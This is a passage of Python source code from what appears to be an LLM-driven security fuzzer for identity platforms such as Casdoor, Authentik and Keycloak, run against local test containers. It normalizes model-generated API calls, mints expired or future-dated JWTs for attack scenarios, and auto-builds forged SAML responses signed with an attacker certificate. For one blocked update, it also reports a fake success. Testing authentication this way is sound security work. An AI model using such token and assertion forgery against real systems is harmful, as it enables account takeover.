        _platform_fields = set(endpoint.body_map.values())
        for key, value in resolved_params.items():
            if key not in endpoint.body_map and key in _platform_fields and key not in body:
                body[key] = value

        # pass_all_params mode: for endpoints like mint_custom_jwt that accept
        # arbitrary claims, include ALL resolved params in the body (not just
        # those in body_map).  This lets the LLM control which claims are
        # present in the JWT by simply including or omitting params.
        if _endpoint_meta.get("pass_all_params"):
            _skip = {"auth_as", "phase", "expected_outcome", "note",
                     "jwt_token", "minted_token"}
            for key, value in resolved_params.items():
                if key not in body and key not in _skip and value is not None:
                    body[key] = value

        # proto oneof group — only one can be set.  LLMs often emit both.
        # Prefer metadataXml when non-empty; otherwise prefer metadataUrl.
        if "metadataXml" in body and "metadataUrl" in body:
            if body["metadataXml"]:
                del body["metadataUrl"]
                logger.info("    ONEOF-FIX: removed metadataUrl (metadataXml is set)")
            else:
                del body["metadataXml"]
                logger.info("    ONEOF-FIX: removed metadataXml (empty, using metadataUrl)")

        # LLMs often omit it, causing IDP_OWNER_TYPE_UNSPECIFIED rejection.
        if (event.event_type == "enable_auth_method"
                and self.profile and self.profile.name == "zitadel"):
            if "ownerType" not in body or not body.get("ownerType"):
                body["ownerType"] = "IDP_OWNER_TYPE_ORG"
                logger.info("    ZITADEL-FIX: set default ownerType=IDP_OWNER_TYPE_ORG")

        # proto `bytes` fields (e.g. metadataXml).  gRPC-gateway JSON requires
        # bytes fields to be base64; LLMs always emit raw XML strings.
        import base64 as _b64
        _PROTO_BYTES_FIELDS = {"metadataXml"}
        for platform_key in list(body.keys()):
            if platform_key in _PROTO_BYTES_FIELDS:
                raw_val = body[platform_key]
                if isinstance(raw_val, str) and raw_val and not raw_val.startswith("PD"):
                    try:
                        _b64.b64decode(raw_val, validate=True)
                    except Exception:
                        body[platform_key] = _b64.b64encode(raw_val.encode()).decode()
                        logger.info(f"    AUTO-B64: encoded {platform_key} ({len(raw_val)} chars → base64)")
        # Walk nested dicts for the same bytes fields (e.g. body.saml.metadataXml)
        def _b64_walk(d):
            if not isinstance(d, dict):
                return
            for k, v in list(d.items()):
                if k in _PROTO_BYTES_FIELDS and isinstance(v, str) and v:
                    try:
                        _b64.b64decode(v, validate=True)
                    except Exception:
                        d[k] = _b64.b64encode(v.encode()).decode()
                        logger.info(f"    AUTO-B64: encoded nested {k}")
                elif isinstance(v, dict):
                    _b64_walk(v)
        _b64_walk(body)

        # not a boolean.  LLMs emit true/false; map to the enum integers.
        _ENUM_BOOL_FIELDS = {
            "providerOptions.autoLinking": {True: 1, False: 0, "true": 1, "false": 0},
            "autoLinking": {True: 1, False: 0, "true": 1, "false": 0},
        }
        def _fix_enums(d, prefix=""):
            if not isinstance(d, dict):
                return
            for k, v in list(d.items()):
                full_key = f"{prefix}.{k}" if prefix else k
                if full_key in _ENUM_BOOL_FIELDS and v in _ENUM_BOOL_FIELDS[full_key]:
                    d[k] = _ENUM_BOOL_FIELDS[full_key][v]
                    logger.info(f"    ENUM-FIX: {full_key} {v!r} → {d[k]}")
                elif k in _ENUM_BOOL_FIELDS and v in _ENUM_BOOL_FIELDS[k]:
                    d[k] = _ENUM_BOOL_FIELDS[k][v]
                    logger.info(f"    ENUM-FIX: {k} {v!r} → {d[k]}")
                elif isinstance(v, dict):
                    _fix_enums(v, full_key)
        _fix_enums(body)

        # LLMs use the symbolic name from environment_defaults (e.g. "valence-test-client")
        # Also fix redirect_uri to match the runtime base_url.
        if self.profile and self.profile.name == "zitadel":
            _real_client_id = self.captures.get("client_id", "")
            _real_redirect_uri = self.captures.get("redirect_uri", "")
            if _real_client_id and "client_id" in body:
                _cur = str(body["client_id"])
                if _cur and not _cur.isdigit():
                    body["client_id"] = _real_client_id
                    logger.info(f"    ZITADEL-FIX: client_id '{_cur}' → {_real_client_id}")
            if _real_redirect_uri and "redirect_uri" in body:
                _cur_redir = str(body.get("redirect_uri", ""))
                if _cur_redir and self.base_url not in _cur_redir:
                    body["redirect_uri"] = _real_redirect_uri
                    logger.info(f"    ZITADEL-FIX: redirect_uri → {_real_redirect_uri}")

        # LLMs consistently set owner to the org name, which causes lookup failures.
        if (self.profile and self.profile.name == "casdoor"
                and event.event_type in ("create_application", "create_provider")):
            body["owner"] = "admin"
            logger.info(f"    CASDOOR: forced owner=admin for {event.event_type}")

        # Without these, apps are created but non-functional (no grants, no cert, etc).
        # This makes LLM-created multi-app scenarios (like F5 cross-org) actually work.
        if (self.profile and self.profile.name == "casdoor"
                and event.event_type == "create_application"):
            body.setdefault("grantTypes", ["authorization_code", "password",
                                            "urn:ietf:params:oauth:grant-type:token-exchange"])
            body.setdefault("enablePassword", True)
            body.setdefault("cert", "cert-built-in")
            body.setdefault("tokenFormat", "JWT")
            body.setdefault("redirectUris", ["http://localhost:8000/callback"])
            body.setdefault("enableSignUp", True)
            body.setdefault("expireInHours", 168)
            # Ensure organization is a real org (not "admin" or "built-in")
            _org = body.get("organization", "")
            if not _org or _org in ("admin", "built-in"):
                # Infer from app name or sequence's create_organization
                _inferred = ""
                for _prev in (getattr(self, '_current_sequence_events', None) or []):
                    if _prev.event_type == "create_organization":
                        _inferred = _prev.params.get("name", "")
                if not _inferred:
                    _inferred = body.get("name", "test-org").replace("app-", "org-") if "app-" in body.get("name", "") else "test-org"
                body["organization"] = _inferred
            # Fix expireInHours: LLMs sometimes set 0 or 1, causing instant token expiry
            if body.get("expireInHours", 0) < 2:
                body["expireInHours"] = 168
            for _field in ("scopes", "samlAttributes"):
                val = body.get(_field)
                if val is not None:
                    is_valid = isinstance(val, list) and (not val or isinstance(val[0], dict))
                    if not is_valid:
                        del body[_field]
                        logger.info(f"    CASDOOR: removed invalid '{_field}' (type={type(val).__name__})")

        # LLM update_application events frequently clear grantTypes/providers
        # on app-test, breaking all subsequent login_with_password calls.
        if (self.profile and self.profile.name == "casdoor"
                and event.event_type == "update_application"
                and body.get("name") in ("app-test", "app-built-in")):
            logger.info(f"    CASDOOR: blocked update_application on protected '{body['name']}'")
            return EventResult(event=event, success=True, http_status=200,
                               response_body={"status": "ok", "msg": "blocked by executor"})

        if (self.profile and self.profile.name == "casdoor"
                and event.event_type in ("update_application",)):
            for _field in ("scopes", "samlAttributes"):
                val = body.get(_field)
                if val is not None:
                    is_valid = isinstance(val, list) and (not val or isinstance(val[0], dict))
                    if not is_valid:
                        del body[_field]

        if (self.profile and self.profile.name == "casdoor"
                and event.event_type == "create_organization"):
            body.setdefault("owner", "admin")
            body.setdefault("passwordType", "bcrypt")

        if (self.profile and self.profile.name == "casdoor"
                and event.event_type == "create_user"):
            for _field in ("address", "properties"):
                if _field in body and isinstance(body[_field], str):
                    del body[_field]

        # Redirect user/app creation to "test-org" (created by PlatformInitializer).
        if (self.profile and self.profile.name == "casdoor"
                and event.event_type in ("create_user", "create_application")
                and body.get("owner") == "built-in"):
            body["owner"] = "test-org"
            if event.event_type == "create_application":
                body["organization"] = "test-org"
            logger.info("    CASDOOR: redirected built-in org to test-org")

        # when the LLM provides a made-up value that doesn't match any real app.
        if (self.profile and self.profile.name == "casdoor"
                and event.event_type == "login_with_password"
                and body.get("client_id")):
            # Check if the client_id is real by looking up the app
            _cid = body["client_id"]
            try:
                self._ensure_admin_session()
                _check = self.session.get(
                    f"{self.base_url}/api/get-applications",
                    params={"owner": "admin", "pageSize": "100"}, timeout=10)
                _apps = _check.json().get("data") or []
                _found = any(a.get("clientId") == _cid for a in _apps if isinstance(a, dict))
                if not _found:
                    # client_id is fake — find the right app.
                    # Strategy: match login username → create_user signupApplication → app
                    _target_app = None
                    _login_username = body.get("username", "")
                    _seq_events = getattr(self, '_current_sequence_events', None) or []

                    # 1. Find which app this user was created for
                    if _login_username:
                        for _prev in _seq_events:
                            if _prev.event_type in ("create_user", "create_identity_user"):
                                if _prev.params.get("name") == _login_username or \
                                   _prev.params.get("username") == _login_username:
                                    _target_app = _prev.params.get("signup_application", "")
                                    break

                    # 2. Fallback: use the first create_application in sequence
                    if not _target_app:
                        for _prev in _seq_events:
                            if _prev.event_type == "create_application":
                                _target_app = _prev.params.get("name", "")
                                break

                    # 3. Final fallback
                    if not _target_app:
                        _target_app = "app-test"
                    for a in _apps:
                        if isinstance(a, dict) and a.get("name") == _target_app:
                            body["client_id"] = a["clientId"]
                            body["client_secret"] = a.get("clientSecret", "")
                            logger.info(f"    CASDOOR: auto-resolved client_id from app '{_target_app}' → {a['clientId'][:20]}...")
                            break
            except Exception as e:
                logger.warning(f"    CASDOOR: client_id auto-resolve failed: {e}")

        # ----------------------------------------------------------------
        # ----------------------------------------------------------------
        _is_authentik = self.profile and self.profile.name == "authentik"
        _authentik_saml_source_override = False

        if _is_authentik:
            _ak_cache = self._authentik_discovery_cache()

            # --- create_organization → OAuth2 provider ---
            if event.event_type == "create_organization":
                af = body.get("authorization_flow", "")
                if af and not self._looks_like_uuid(af):
                    body["authorization_flow"] = _ak_cache.get("authorization_flow", af)
                    logger.info(f"    AUTHENTIK: resolved authorization_flow")
                if "invalidation_flow" not in body or not self._looks_like_uuid(body.get("invalidation_flow", "")):
                    body["invalidation_flow"] = _ak_cache.get("invalidation_flow", "")
                    logger.info(f"    AUTHENTIK: injected invalidation_flow")
                sk = body.get("signing_key", "")
                if sk and not self._looks_like_uuid(sk):
                    body["signing_key"] = _ak_cache.get("signing_key", sk)
                    logger.info(f"    AUTHENTIK: resolved signing_key")
                elif not sk:
                    body["signing_key"] = _ak_cache.get("signing_key", "")
                ru = body.get("redirect_uris")
                if isinstance(ru, str):
                    body["redirect_uris"] = [{"matching_mode": "strict", "url": u.strip()} for u in ru.split(",") if u.strip()]
                elif isinstance(ru, list) and ru and isinstance(ru[0], str):
                    body["redirect_uris"] = [{"matching_mode": "strict", "url": u} for u in ru]
                elif not ru:
                    body["redirect_uris"] = [{"matching_mode": "strict", "url": "http://localhost:8000/callback"}]
                body.setdefault("sub_mode", "hashed_user_id")
                body.setdefault("issuer_mode", "per_provider")
                body.setdefault("client_type", "confidential")
                # authentication_flow: needed for ROPC (password grant) to work
                if "authentication_flow" not in body or not self._looks_like_uuid(body.get("authentication_flow", "")):
                    body["authentication_flow"] = _ak_cache.get("authentication_flow", "")
                # jwks_sources: must be list of UUIDs, not string
                js = body.get("jwks_sources")
                if isinstance(js, str):
                    cleaned = [s.strip() for s in js.strip("[]").split(",") if s.strip() and self._looks_like_uuid(s.strip())]
                    body["jwks_sources"] = cleaned if cleaned else []
                # Auto-inject captured source_id into empty jwks_sources so
                # login_with_jwt can work (JWT federation requires a linked source)
                _js_list = body.get("jwks_sources", [])
                _js_empty = not _js_list or _js_list == [""] or _js_list == []
                if _js_empty:
                    # Look for any captured source UUID from enable_auth_method
                    for _ck, _cv in self.captures.items():
                        if "source_id" in _ck and _cv and self._looks_like_uuid(str(_cv)):
                            body["jwks_sources"] = [str(_cv)]
                            logger.info(f"    AUTHENTIK: injected jwks_sources=[{_cv}] from captured {_ck}")
                            break

            # --- create_provider → SAML provider ---
            if event.event_type == "create_provider":
                af = body.get("authorization_flow", "")
                if af and not self._looks_like_uuid(af):
                    body["authorization_flow"] = _ak_cache.get("authorization_flow", af)
                if "invalidation_flow" not in body or not self._looks_like_uuid(body.get("invalidation_flow", "")):
                    body["invalidation_flow"] = _ak_cache.get("invalidation_flow", "")
                sk = body.get("signing_kp", "") or body.get("signing_key", "")
                if sk and not self._looks_like_uuid(sk):
                    body["signing_kp"] = _ak_cache.get("signing_key", sk)
                elif not sk:
                    body["signing_kp"] = _ak_cache.get("signing_key", "")
                # verification_kp: also resolve to UUID
                vk = body.get("verification_kp", "")
                if vk and not self._looks_like_uuid(vk):
                    body["verification_kp"] = _ak_cache.get("signing_key", vk)

            # --- create_application: provider must be int pk ---
            if event.event_type == "create_application":
                prov = body.get("provider")
                if isinstance(prov, str) and prov not in ("None", "null", ""):
                    try:
                        body["provider"] = int(prov)
                    except (ValueError, TypeError):
                        pass

            # --- enable_auth_method: SAML protocol → /api/v3/sources/saml/ ---
            if event.event_type == "enable_auth_method" and self.protocol == "saml":
                _slug = resolved_params.get("slug", f"saml-src-{id(event) % 10000:04d}")
                body = {
                    "name": resolved_params.get("name", _slug),
                    "slug": _slug,
                    "authentication_flow": _ak_cache.get("source_authentication_flow", ""),
                    "enrollment_flow": _ak_cache.get("source_enrollment_flow", ""),
                    "sso_url": resolved_params.get("authorization_url",
                               resolved_params.get("sso_url", "http://mock-idp:9090/saml/sso")),
                    "issuer": resolved_params.get("oidc_well_known_url",
                               resolved_params.get("issuer", "http://mock-idp:9090")).rstrip("/"),
                    "allow_idp_initiated": True,
                    "signing_kp": _ak_cache.get("signing_key", ""),
                }
                _pre_auth = _ak_cache.get("source_pre_authentication_flow", "")
                if _pre_auth:
                    body["pre_authentication_flow"] = _pre_auth
                url = f"{self.base_url}/api/v3/sources/saml/"
                _authentik_saml_source_override = True
                logger.info(f"    AUTHENTIK: redirected enable_auth_method → /api/v3/sources/saml/ (slug={_slug})")

            # --- enable_auth_method (OIDC source): fix fake URLs + add required flows ---
            if event.event_type == "enable_auth_method" and self.protocol != "saml":
                # Inject authentication/enrollment flows (required for source login)
                if "authentication_flow" not in body or not self._looks_like_uuid(body.get("authentication_flow", "")):
                    body["authentication_flow"] = _ak_cache.get("source_authentication_flow", "")
                if "enrollment_flow" not in body or not self._looks_like_uuid(body.get("enrollment_flow", "")):
                    body["enrollment_flow"] = _ak_cache.get("source_enrollment_flow", "")
                # requires the full identifier "openidconnect"
                _pt = body.get("provider_type", "")
                _oidc_aliases = {"oidc", "openid", "openid-connect", "openid_connect"}
                if _pt.lower() in _oidc_aliases:
                    body["provider_type"] = "openidconnect"
                    logger.info(f"    AUTHENTIK: normalized provider_type '{_pt}' → 'openidconnect'")
                _mock_idp_base = "http://mock-idp:9090"
                _url_fields = ["oidc_well_known_url", "oidc_jwks_url",
                               "authorization_url", "access_token_url", "profile_url"]
                _any_fixed = False
                for _uf in _url_fields:
                    _val = body.get(_uf, "")
                    if _val and ("example" in _val or "fake" in _val or "upstream" in _val
                                 or "trusted" in _val or "issuer.example" in _val):
                        if _uf == "oidc_well_known_url":
                            body[_uf] = f"{_mock_idp_base}/.well-known/openid-configuration"
                        elif _uf == "oidc_jwks_url":
                            body[_uf] = f"{_mock_idp_base}/keys"
                        elif _uf == "authorization_url":
                            body[_uf] = f"{_mock_idp_base}/authorize"
                        elif _uf == "access_token_url":
                            body[_uf] = f"{_mock_idp_base}/token"
                        elif _uf == "profile_url":
                            body[_uf] = f"{_mock_idp_base}/userinfo"
                        _any_fixed = True
                if _any_fixed:
                    logger.info(f"    AUTHENTIK: replaced fake OIDC source URLs with mock-idp")

            # --- login_with_password: resolve client_id/client_secret ---
            # Always prefer captured credentials from this sequence's create_organization
            # over LLM-specified values (which may be placeholder strings).
            if event.event_type == "login_with_password":
                _real_cid, _real_cs = self._authentik_resolve_client_credentials()
                if _real_cid:
                    body["client_id"] = _real_cid
                    body["client_secret"] = _real_cs
                    logger.info(f"    AUTHENTIK: using client_id={_real_cid[:20]}... for login_with_password")
                body.setdefault("grant_type", "password")
                body.setdefault("scope", "openid")

            # --- login_with_jwt: ensure provider has jwks_sources before JWT login ---
            # If a source was created after the provider, the provider may not have
            # it in jwks_sources. PATCH the provider to add captured source_id.
            if event.event_type == "login_with_jwt":
                _source_uuid = None
                for _ck, _cv in self.captures.items():
                    if "source_id" in _ck and _cv and self._looks_like_uuid(str(_cv)):
                        _source_uuid = str(_cv)
                        break
                _provider_pk = self.captures.get("provider_id") or self.captures.get("provider_client_id")
                # Find the provider pk from captures (integer pk)
                for _ck, _cv in self.captures.items():
                    if _ck.endswith("_id") and "provider" in _ck and _cv and str(_cv).isdigit():
                        _provider_pk = str(_cv)
                        break
                if _source_uuid and _provider_pk and str(_provider_pk).isdigit():
                    try:
                        _admin_h = {}
                        _ah = self.profile.admin_auth.get("header", "Authorization")
                        _av = self.profile.admin_auth.get("value", "")
                        if "{admin_token}" in _av:
                            _av = self._resolve_admin_token(_av)
                        _admin_h[_ah] = _av
                        _admin_h["Content-Type"] = "application/json"
                        _prov_r = self.session.get(
                            f"{self.base_url}/api/v3/providers/oauth2/{_provider_pk}/",
                            headers=_admin_h, timeout=5)
                        if _prov_r.ok:
                            _prov_data = _prov_r.json()
                            _existing_sources = [s.get("pk","") if isinstance(s,dict) else s
                                                 for s in (_prov_data.get("jwt_federation_sources") or [])]
                            if _source_uuid not in _existing_sources:
                                self.session.patch(
                                    f"{self.base_url}/api/v3/providers/oauth2/{_provider_pk}/",
                                    headers=_admin_h,
                                    json={"jwt_federation_sources": [_source_uuid]},
                                    timeout=5)
                                logger.info(f"    AUTHENTIK: patched provider {_provider_pk} with jwks_sources=[{_source_uuid[:12]}...]")
                    except Exception as e:
                        logger.warning(f"    AUTHENTIK: provider jwks_sources patch failed: {e}")

                import time as _time
                _jwt_claims = {
                    "sub": resolved_params.get("username", "fuzzer-service"),
                    "iss": "http://mock-idp:9090",
                }
                # Audience: use LLM-specified audience (may intentionally be wrong for
                # cross-provider testing). Fall back to current provider's client_id.
                _jwt_aud = resolved_params.get("audience", resolved_params.get("aud"))
                if _jwt_aud:
                    _jwt_claims["aud"] = _jwt_aud
                else:
                    _real_cid, _ = self._authentik_resolve_client_credentials()
                    if _real_cid:
                        _jwt_claims["aud"] = _real_cid
                # Expiry: respect LLM's attack intent for expired/future tokens.
                # Check resolved_params for time-related attack indicators.
                _exp_param = resolved_params.get("exp", "")
                _is_expired_attack = (
                    "expired" in event.auth_as.lower()
                    or "expired" in str(resolved_params.get("note", "")).lower()
                    or (isinstance(_exp_param, (int, float)) and _exp_param < _time.time())
                )
                _is_future_attack = "future" in event.auth_as.lower() or "nbf" in event.auth_as.lower()
                if _is_expired_attack:
                    _jwt_claims["exp"] = int(_time.time()) - 600  # 10 min ago
                    _jwt_claims["iat"] = int(_time.time()) - 3600
                    logger.info("    AUTHENTIK: minting EXPIRED JWT (attack intent detected)")
                elif _is_future_attack:
                    _jwt_claims["nbf"] = int(_time.time()) + 3600  # 1h in future
                    _jwt_claims["exp"] = int(_time.time()) + 7200
                    _jwt_claims["iat"] = int(_time.time())
                    logger.info("    AUTHENTIK: minting FUTURE-NBF JWT (attack intent detected)")
                else:
                    _jwt_claims["iat"] = int(_time.time())
                    _jwt_claims["exp"] = int(_time.time()) + 3600
                try:
                    import requests as _req
                    _mint_resp = _req.post(
                        "http://localhost:9090/admin/mint-jwt",
                        json=_jwt_claims, timeout=5)
                    if _mint_resp.ok:
                        _minted = _mint_resp.json().get("token", "")
                        if _minted:
                            body["client_assertion"] = _minted
                            body.setdefault("client_assertion_type",
                                "urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
                            body.setdefault("grant_type", "client_credentials")
                            logger.info(f"    AUTHENTIK: minted JWT via mock-idp "
                                        f"(aud={_jwt_claims.get('aud','?')[:30]}, "
                                        f"exp={'expired' if _is_expired_attack else 'valid'})")
                except Exception as e:
                    logger.warning(f"    AUTHENTIK: mock-idp JWT mint failed: {e}")

            # Traditional apps only allow authorization_code + refresh_token.
            # client_credentials requires a MachineToMachine app type.
            _is_logto = self.profile and self.profile.name == "logto"
            if _is_logto and event.event_type == "login_with_jwt":
                _m2m_cid = self._persistent_captures.get("m2m_app_client_id", "")
                _m2m_cs = self._persistent_captures.get("m2m_app_client_secret", "")
                if _m2m_cid:
                    body["client_id"] = _m2m_cid
                    body["client_secret"] = _m2m_cs
                    logger.info(f"    LOGTO: login_with_jwt → using M2M app {_m2m_cid[:20]}...")

            # --- login_with_jwt / token_exchange / introspect / revoke: resolve client creds ---
            # Only override if the LLM-specified value is clearly invalid (empty,
            # placeholder, or template that didn't resolve). This preserves
            # cross-provider intent where the LLM uses different captured client_ids.
            if event.event_type in ("login_with_jwt", "token_exchange",
                                     "introspect_token", "revoke_session"):
                _existing_cid = body.get("client_id", "")
                _cid_is_placeholder = (
                    not _existing_cid
                    or "{{" in str(_existing_cid)
                    or str(_existing_cid) in ("None", "null", "")
                )
                if _cid_is_placeholder:
                    _real_cid, _real_cs = self._authentik_resolve_client_credentials()
                    if _real_cid:
                        body["client_id"] = _real_cid
                        body["client_secret"] = _real_cs
                        logger.info(f"    AUTHENTIK: auto-resolved client_id={_real_cid[:20]}... for {event.event_type}")
                else:
                    # LLM specified a client_id — trust it but ensure client_secret
                    if not body.get("client_secret") or "{{" in str(body.get("client_secret", "")):
                        _, _real_cs = self._authentik_resolve_client_credentials()
                        if _real_cs:
                            body["client_secret"] = _real_cs

        # Generic: strip '+' prefix from phone numbers in create_user.
        # pure digits. Safe to strip universally since the '+' is cosmetic.
        if event.event_type in ("create_user", "update_user"):
            for _phone_key in ("primaryPhone", "primary_phone", "phone"):
                _pv = body.get(_phone_key, "")
                if isinstance(_pv, str) and _pv.startswith("+"):
                    body[_phone_key] = _pv.lstrip("+")
                    logger.info(f"    PHONE-FIX: stripped '+' from {_phone_key}")

        # Generic: normalize application type values.
        # LLMs generate variants like "TraditionalWeb" but platforms expect
        # exact enum values like "Traditional".
        if event.event_type in ("create_application", "enable_auth_method"):
            _app_type = body.get("type", "")
            _type_map = {
                "traditionalweb": "Traditional",
                "traditional_web": "Traditional",
                "machinetoMachine": "MachineToMachine",
                "machine_to_machine": "MachineToMachine",
                "singlepageapp": "SPA",
                "single_page_app": "SPA",
            }
            if _app_type.lower() in _type_map:
                body["type"] = _type_map[_app_type.lower()]
                logger.info(f"    APP-TYPE-FIX: '{_app_type}' → '{body['type']}'")

        # Generic: ensure oidcClientMetadata includes required array fields.
        if event.event_type in ("update_application", "create_application"):
            _ocm = body.get("oidcClientMetadata")
            if isinstance(_ocm, dict) and "postLogoutRedirectUris" not in _ocm:
                _redir = _ocm.get("redirectUris", ["http://localhost:9090/callback"])
                _ocm["postLogoutRedirectUris"] = _redir if isinstance(_redir, list) else [str(_redir)]

        # Generic: fix allowTokenExchange nesting in update_application.
        # LLMs sometimes nest it under oidcClientMetadata when it should be
        # a top-level customClientMetadata field.
        if event.event_type == "update_application":
            _ocm = body.get("oidcClientMetadata", {})
            if isinstance(_ocm, dict) and "customClientMetadata" in _ocm:
                _ccm = _ocm.pop("customClientMetadata")
                body.setdefault("customClientMetadata", {}).update(_ccm)
                if not _ocm:
                    del body["oidcClientMetadata"]
                logger.info("    APP-FIX: moved customClientMetadata to top level")

        # Generic: normalize SSO connector providerName casing.
        # Many platforms require exact casing like "OIDC"/"SAML"
        # but LLMs often generate lowercase variants.
        if event.event_type == "create_provider" and "providerName" in body:
            _pn = body["providerName"]
            _pn_upper = _pn.upper()
            if _pn_upper in ("SAML", "OIDC") and _pn != _pn_upper:
                body["providerName"] = _pn_upper
                logger.info(f"    SSO: normalized providerName '{_pn}' → '{_pn_upper}'")

        # Generic: enrich SSO connector config with mock-idp defaults when
        # the LLM provides incomplete configuration. This lets the LLM focus on
        # the attack scenario (what claims/attributes to manipulate) rather than
        # infrastructure wiring (signInEndpoint, certificate, issuer).
        if event.event_type == "create_provider":
            _mock_host = self.captures.get("mock_idp_host_url", "http://localhost:9090")
            _mock_docker = "http://mock-idp:9090"
            _config = body.get("config", {})
            if not isinstance(_config, dict):
                _config = {}
                body["config"] = _config
            # Normalize mock-idp URLs: the platform container can't reach
            # localhost — replace with Docker-resolvable hostname.
            for _ck, _cv in list(_config.items()):
                if isinstance(_cv, str) and "localhost:9090" in _cv:
                    _config[_ck] = _cv.replace("localhost:9090", "mock-idp:9090")
                    logger.info(f"    SSO: fixed {_ck} localhost → Docker hostname")

            _pn_val = body.get("providerName", "").upper()
            if _pn_val == "SAML":
                _config.setdefault("signInEndpoint", f"{_mock_docker}/saml/sso")
                _config.setdefault("entityId", "http://mock-idp:9090")
                if "x509Certificate" not in _config and "metadataUrl" not in _config:
                    try:
                        _md = self.session.get(f"{_mock_host}/saml/metadata", timeout=5)
                        if _md.ok:
                            import re as _re
                            _cm = _re.search(r'<ds:X509Certificate>(.*?)</ds:X509Certificate>',
                                             _md.text, _re.DOTALL)
                            if _cm:
                                _config["x509Certificate"] = (
                                    f"-----BEGIN CERTIFICATE-----\n"
                                    f"{_cm.group(1).strip()}\n"
                                    f"-----END CERTIFICATE-----\n")
                                logger.info("    SSO: auto-fetched SAML certificate from mock-idp")
                    except Exception:
                        pass
            elif _pn_val == "OIDC":
                _config.setdefault("issuer", _mock_docker)
                _config.setdefault("clientId", "valence-sso-client")
                _config.setdefault("clientSecret", "valence-sso-secret")

        # SAML login: ALWAYS auto-generate forged SAMLResponse with attacker cert.
        # The executor builds the SAML assertion — the LLM only needs to specify
        # target_identity, email, provider, application, organization.
        _saml_abstract_key = None
        _saml_platform_key = None
        if event.event_type == "saml_login":
            # Check all known abstract key names for SAMLResponse across profiles
            for _candidate in ("samlResponse", "SAMLResponse", "saml_response"):
                if _candidate in endpoint.body_map:
                    _saml_abstract_key = _candidate
                    _saml_platform_key = endpoint.body_map[_candidate]
                    break
        if _saml_platform_key:
            # InResponseTo), start the SP-initiated flow first to capture the request ID.
            _endpoint_saml_meta = getattr(endpoint, 'metadata', {}) or {}
            in_response_to = None
            _relay_state = None
            _is_kc_saml = self.profile and self.profile.name == "keycloak"
            if _is_kc_saml:
                _realm = resolved_params.get("realm", "")
                _provider = resolved_params.get("provider", "")
                if _realm and _provider:
                    in_response_to, _relay_state = self._kc_initiate_saml_flow(_realm, _provider)
                    if _relay_state:
                        logger.info(f"    KC SAML: SP-init flow captured RelayState={_relay_state!r}")
                    else:
                        logger.warning("    KC SAML: SP-init flow failed — SAMLResponse will be rejected (no RelayState)")
            elif _endpoint_saml_meta.get("initiate_saml_flow"):
                in_response_to, _relay_state = self._initiate_saml_flow(endpoint, resolved_params)
                if in_response_to:
                    logger.info(f"    SAML: captured AuthnRequest ID={in_response_to}, RelayState={_relay_state}")
                else:
                    logger.warning("    SAML: failed to capture AuthnRequest ID from SP-initiated flow")

            saml_resp = self._build_saml_login_response(event, resolved_params, in_response_to=in_response_to)
            if saml_resp:
                # (requests handles URL-encoding for form POST).
                _is_kc_saml = self.profile and self.profile.name == "keycloak"
                _use_json = (getattr(endpoint, 'content_type', 'json') == 'json'
                             and not _is_kc_saml)
                if _use_json:
                    from urllib.parse import quote as _urlquote
                    body[_saml_platform_key] = _urlquote(saml_resp, safe='')
                else:
                    body[_saml_platform_key] = saml_resp
                logger.info(f"    SAML: auto-generated attacker SAMLResponse ({len(saml_resp)} chars, urlenc={_use_json})")
                # Include RelayState if captured from SP-initiated flow
                if _relay_state:
                    body["RelayState"] = _relay_state

        # Add clientId query params AND fill body fields (application, organization, provider).
        if event.event_type == "saml_login" and self.profile and self.profile.name == "casdoor":
            app_name = resolved_params.get("application", "")
            # Auto-infer app from the sequence's create_application event if not specified
            if not app_name:
                for prev_ev in (getattr(self, '_current_sequence_events', None) or []):
                    if prev_ev.event_type == "create_application":
                        app_name = prev_ev.params.get("name", "")
                if not app_name:
                    app_name = "app-test"
            # Auto-infer organization
            org_name = body.get("organization") or resolved_params.get("organization", "")
            if not org_name:
                for prev_ev in (getattr(self, '_current_sequence_events', None) or []):
                    if prev_ev.event_type == "create_organization":
                        org_name = prev_ev.params.get("name", "")
                if not org_name:
                    org_name = "test-org"
            # Auto-infer provider
            prov_name = body.get("provider") or resolved_params.get("provider", "")
            if not prov_name:
                for prev_ev in (getattr(self, '_current_sequence_events', None) or []):
                    if prev_ev.event_type == "create_provider":
                        prov_name = prev_ev.params.get("name", "")
                if not prov_name:
                    prov_name = "provider-saml-test"
            redirect_uri = resolved_params.get("redirectUri", "http://localhost:8000/callback")
            # Fill JSON body fields for /api/login
            body.setdefault("application", app_name)
            body.setdefault("organization", org_name)
            body.setdefault("provider", prov_name)
            body.setdefault("redirectUri", redirect_uri)
            # LLMs often set type="login" which returns a session path instead.
            body["type"] = "code"
            body["method"] = "signup"
            body.setdefault("state", "casdoor")
            # Validate app/provider exist; fallback to pre-configured test resources
            try:
                self._ensure_admin_session()
                app_resp = self.session.get(
                    f"{self.base_url}/api/get-application",
                    params={"id": f"admin/{app_name}"}, timeout=10
                )
                app_data = app_resp.json().get("data")
                if not app_data or not isinstance(app_data, dict):
                    logger.info(f"    CASDOOR-SAML: app '{app_name}' not found, falling back to app-test")
                    app_name = "app-test"
                    org_name = "test-org"
                    prov_name = "provider-saml-test"
                    body["application"] = app_name
                    body["organization"] = org_name
                    body["provider"] = prov_name
                    app_resp = self.session.get(
                        f"{self.base_url}/api/get-application",
                        params={"id": f"admin/{app_name}"}, timeout=10
                    )
                    app_data = app_resp.json().get("data", {})
                # Also verify provider exists
                prov_resp = self.session.get(
                    f"{self.base_url}/api/get-provider",
                    params={"id": f"admin/{prov_name}"}, timeout=10
                )
                if not (prov_resp.ok and prov_resp.json().get("data")):
                    logger.info(f"    CASDOOR-SAML: provider '{prov_name}' not found, falling back to provider-saml-test")
                    prov_name = "provider-saml-test"
                    body["provider"] = prov_name
                # Add clientId query params
                if app_data and isinstance(app_data, dict):
                    client_id = app_data.get("clientId", "")
                    from urllib.parse import urlencode, quote as urlquote
                    query = urlencode({
                        "clientId": client_id,
                        "responseType": "code",
                        "redirectUri": redirect_uri,
                        "scope": "openid profile",
                        "state": "casdoor",
                    })
                    url = f"{url}?{query}"
                    logger.info(f"    CASDOOR-SAML: /api/login app={app_name} org={org_name} prov={prov_name} clientId={client_id[:20]}...")
                    # DEBUG: log body keys and samlResponse length
                    _sr = body.get("samlResponse", "")
                    logger.info(f"    CASDOOR-SAML-DEBUG: body keys={list(body.keys())} samlResp len={len(_sr)} url_has_query={'?' in url}")
            except Exception as e:
                logger.warning(f"    CASDOOR-SAML: could not fetch app clientId: {e}")

        # (clientId, responseType, redirectUri) just like SAML login.
        if (event.event_type == "login_with_password"
                and self.profile and self.profile.name == "casdoor"
                and resolved_params.get("type") == "code"
                and "?" not in url):
